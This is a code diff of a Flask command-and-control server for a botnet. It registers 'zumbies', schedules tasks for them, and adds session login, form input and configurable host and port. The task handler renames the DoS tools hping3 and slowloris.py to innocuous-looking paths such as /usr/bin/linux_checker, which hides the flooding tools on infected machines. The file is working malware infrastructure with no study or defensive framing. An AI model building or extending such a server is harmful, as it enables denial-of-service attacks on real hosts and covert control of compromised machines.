@@ -1,8 +1,17 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, session, url_for, redirect, render_template
 from functools import wraps
+import os
 import datetime
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-p', '--port', type=int, default=5000)
+parser.add_argument('-H', '--host', type=str, default="0.0.0.0")
+args = parser.parse_args()
 
 app = Flask(__name__, static_url_path='/s', static_folder='static')
+app.secret_key = os.urandom(12)
+
 zumbies = {}
 tasks = {}
 
@@ -19,6 +28,7 @@ def login_required(f):
             return ('Unauthorized', 401, {
                 'WWW-Authenticate': 'Basic realm="Login Required"'
             })
+        session["is_authenticated"] = True
 
         return f(**kwargs)
 
@@ -30,10 +40,11 @@ def get_home():
     return render_template("index.html")
 
 
-@app.route("/admin")
+@app.route("/admin", methods=["GET"])
 @login_required
 def get_admin():
-    return render_template("admin.html", zumbies=zumbies, tasks=tasks)
+    now = datetime.datetime.now().timestamp()
+    return render_template("admin.html", zumbies=zumbies, tasks=tasks, now=now)
 
 
 @app.route("/register", methods=["POST"])
@@ -54,16 +65,25 @@ def get_zumbies():
 @app.route("/new_task", methods=["POST"])
 def new_task():
     global tasks
-    data = request.get_json()
+    if "is_authenticated" in session:
+        data = dict(request.form)
+    else:
+        data = request.get_json()
+    now = datetime.datetime.now().timestamp()
     try:
-        when = datetime.datetime.strptime(data["when"], "%Y-%m-%d,%H:%M:%S")
+        if data["when"].isdigit():
+            when = now + int(data["when"])
+        else:
+            when = datetime.datetime.strptime(data["when"], "%Y-%m-%d,%H:%M:%S").timestamp()
     except:
-        return "Invalid 'when' attribute (format YYYY-MM-DD,HH:MM:SS)", 400
-    if when.timestamp() < datetime.datetime.now().timestamp() + 90:
+        return "Invalid 'when' attribute (format YYYY-MM-DD,HH:MM:SS or S number of seconds from now)", 400
+    if when < now + 90:
         return "Invalid 'when' attribute: must be at least 90s from now", 400
-    if when.timestamp() in tasks:
+    if when in tasks:
         return "Cannot add two tasks at the same time", 400
-    tasks[when.timestamp()] = data["task"].replace("hping3", "/usr/bin/linux_checker").replace("slowloris.py", "/usr/bin/linux_verify")
+    tasks[when] = data["task"].replace("hping3", "/usr/bin/linux_checker").replace("slowloris.py", "/usr/bin/linux_verify")
+    if "is_authenticated" in session:
+        return redirect(url_for('get_admin'))
     return "OK"
 
 
@@ -87,4 +107,4 @@ def get_tasks():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host=args.host, port=args.port)
